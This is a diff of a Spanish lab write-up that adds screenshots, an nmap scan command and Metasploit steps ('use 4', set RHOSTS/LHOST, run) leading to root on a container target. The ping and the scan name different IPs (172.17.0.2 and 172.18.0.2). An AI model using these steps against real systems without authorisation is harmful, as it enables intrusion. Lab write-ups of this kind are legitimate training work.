@@ -24,13 +24,17 @@ El objetivo fue identificar los servicios activos, detectar una posible vulnerab
 
     ping -c 1 172.17.0.2
 
+![Ping a la IP](screenshots/ping.PNG)
+
 Se comprobó que la máquina objetivo está activa en la red.
 
 ---
 
 ### 2. Escaneo de puertos
 
-(No se especifica, pero se asume un escaneo previo que reveló el servicio SSH.)
+        nmap -sV -sC -p- 172.18.0.2 --open -oN scanPuertos.txt
+
+![puertos](screenshots/puertos.PNG)
 
 ---
 
@@ -42,12 +46,17 @@ Iniciamos Metasploit:
 
 Buscamos módulos relacionados con SSH. Las opciones 0 y 4 se consideraron útiles. Se eligió la opción 4.
 
+![metasploit](screenshots/metasploit.PNG)
+
 Configuramos los parámetros:
 
     use 4
     set RHOSTS 172.17.0.2
     set LHOST (Mi IP)
     run
+
+![root](screenshots/root.PNG)
+
 
 ---
 
